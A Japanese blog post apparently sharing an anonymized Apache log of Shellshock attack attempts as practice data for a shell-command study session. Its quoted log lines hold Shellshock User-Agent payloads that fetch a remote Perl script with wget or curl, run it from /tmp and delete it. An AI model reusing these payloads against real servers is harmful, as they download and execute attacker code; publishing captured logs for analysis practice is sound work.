# 第16回シェル芸勉強会で使うログ（邪悪なApache ShellShockログ）を公開します
これは<a href="http://blog.ueda.asia/?p=5620" title="シェル芸が実写化されました">エイプリルフール</a>でもなんでもなく、必要なので公開します。当日公開のほうが盛り上がるかなーと思ったのですが、出し惜しみせずに練習してもらった方がよいかと判断しました。<a href="https://usptomo.doorkeeper.jp/events/22117">第16回シェル芸勉強会のページはこちらです。</a><br />
<br />
今のところ、ログは<a href="http://ita.ee.lbl.gov/html/contrib/NASA-HTTP.html">NASAが公開しているもの</a>と、次のShellshock関連のログ（採取元: 私のブログ）を用いようと考えています。ナマのログを出すとあんまりよくないと考え、IPアドレスは頭をすべて192.168に変換しています。<br />
<br />
<!--more--><br />
<br />
<a href="access.log_.shellshock.gz">http://blog.ueda.asia/wp-content/uploads/2015/04/access.log_.shellshock.gz</a><br />
<br />
これが中身です。どんな問題が出るか予想しながらいじってみていただければと。<br />
<br />
[bash]<br />
uedambp:tmp ueda$ gzcat access.log.shellshock.gz | tail -n 3<br />
192.168.193.42 - - [12/Dec/2014:19:23:59 +0900] &quot;GET /phppath/cgi_wrapper HTTP/1.1&quot; 302 227 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*\\&quot;);'&quot;<br />
192.168.193.42 - - [12/Dec/2014:19:23:59 +0900] &quot;GET /phppath/php HTTP/1.1&quot; 302 219 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*\\&quot;);'&quot;<br />
192.168.225.64 - - [15/Dec/2014:03:12:20 +0900] &quot;GET /phppath/cgi_wrapper HTTP/1.1&quot; 302 227 &quot;-&quot; &quot;() { :;};/usr/bin/perl -e 'print \\&quot;Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\&quot;;system(\\&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*\\&quot;);'&quot;<br />
[/bash]<br />
<br />
<br />
ヤバイ・・・<br />
<br />
<br />
寝る。
